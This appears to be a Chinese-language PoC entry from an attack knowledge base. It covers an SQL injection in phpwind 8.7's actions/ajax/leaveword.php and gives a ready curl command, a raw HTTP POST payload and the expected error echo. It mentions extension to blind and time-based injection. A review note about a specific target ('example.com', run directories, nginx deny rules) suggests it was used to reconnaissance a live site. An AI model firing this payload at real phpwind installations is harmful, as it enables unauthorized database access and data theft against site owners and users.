# phpwind 8.7 前台 SQL 注入（actions/ajax/leaveword.php）

- **code**: phpwind-8.7-前台-sql-注入-actions-ajax-leaveword.php
- **kind**: poc
- **category**: sqli
- **component**: phpwind
- **severity**: high
- **language**: http
- **source**: web
- **source_url**: https://raw.githubusercontent.com/youmengxuefei/wooyun/master/bugs/wooyun-2011-02720.html
- **verified_note**: 【2026-09-30 example.com 白盒复核 → 该漏洞在本目标版本已修复，后续同圈子 phpwind 8.7 请先读此结论再决定是否投入】

知识库原记载的注入点为 actions/ajax/leaveword.php 的 leaveword 写入语句。在本轮从目标拉取的完整源码（runs/hklot/pw-src，3881 文件）中逐行核对，该处已被官方改写为参数化绑定：

  actions/ajax/target47.example.com:80   //* $db->update("UPDATE $pw_posts SET leaveword=" . S::sqlEscape($atc_content) . " $sqladd WHERE pid=" ...);   ← 原注入语句，已被注释
  actions/ajax/target47.example.com:81   $db->update(pwQuery::buildClause("UPDATE :pw_table SET leaveword=:leaveword WHERE pid=:pid AND tid=:tid", array($pw_posts,$atc_content,intval($pid),$tid)));   ← 占位符绑定，$atc_content 不再拼接

同文件其余 SQL 亦全部走 S::sqlEscape（require/target48.example.com:293-305）+ S::gp 的 escapeStr（target48.example.com:227-234，会把单引号实体化为 &#39;）：
  leaveword.php:9 / 14 / 36 / 52  均 "... WHERE tid=" . S::sqlEscape($tid) 形式，$tid/$pid 先过 S::gp，表名 $pw_posts 来自 GetPtable($tpc['ptable'])（库内字段，不可控）。

另注：
· 触发该 action 需 pw_example.com?action=leaveword（leaveword 在 pw_example.com:39 的 $whiteActions 内，但不在游客白名单），即需登录态；
· 目标 898 实例 /actions/ 整目录被 nginx deny（9 字节 Forbidden），不能直连 actions/ajax/leaveword.php，只能走 pw_example.com 路由。

结论：本条在 example.com 上不可利用。保留原记录作为历史手法参考，勿再对本站重复投入。
- **path**: pocs/phpwind-8.7-前台-sql-注入-actions-ajax-leaveword.php/poc.http
- **tags**: phpwind,sql注入,front-end
- **created_at**: 2026-09-28T20:08:17.578Z
- **found_by**: vuln-scan

## 描述

phpwind 8.7 前台 SQL 注入：atc_content 可注入占位符、pid 未 intval，触发点为 actions/ajax/leaveword.php（WOOYUN-2011-02720 / seebug ssvid-20902）

## 用法

```
curl -s -X POST "http://TARGET/actions/ajax/leaveword.php" -d "pid=asd&atc_content=:pid&ifmsg=0"（或经 pw_example.com?action=leaveword 路由）。观察是否返回 Query Error 语句拼接回显。
```

## 正文

```
漏洞点：phpwind lib/utility/querybuilder.class.php 的 _parseStatement() 未处理 $atc_content 内的 SQL 占位符，且 actions/ajax/leaveword.php 第 31 行 S::gp(array('pid','atc_content','ifmsg'),'P') 未对 pid 强制 intval。

第 78 行原代码（来自 WOOYUN-2011-02720）：
  $db->update(pwQuery::buildClause("UPDATE :pw_table SET leaveword=" . S::sqlEscape($atc_content) . " $sqladd WHERE pid=:pid AND tid=:tid", array($pw_posts, $pid, $tid)));

原始请求：
  POST /actions/ajax/leaveword.php HTTP/1.1
  Host: TARGET
  Content-Type: application/x-www-form-urlencoded
  Content-Length: 33

  pid=asd&atc_content=:pid&ifmsg=0

预期（漏洞成立时）回显：
  Query Error: UPDATE pw_posts SET leaveword= ''asd' ' WHERE pid= 'asd' AND tid= ''

限制：phpwind 会替换 '=' 与 ')'，注入深度受限，主要用于报错型确认与盲注/时间盲注扩展。
```
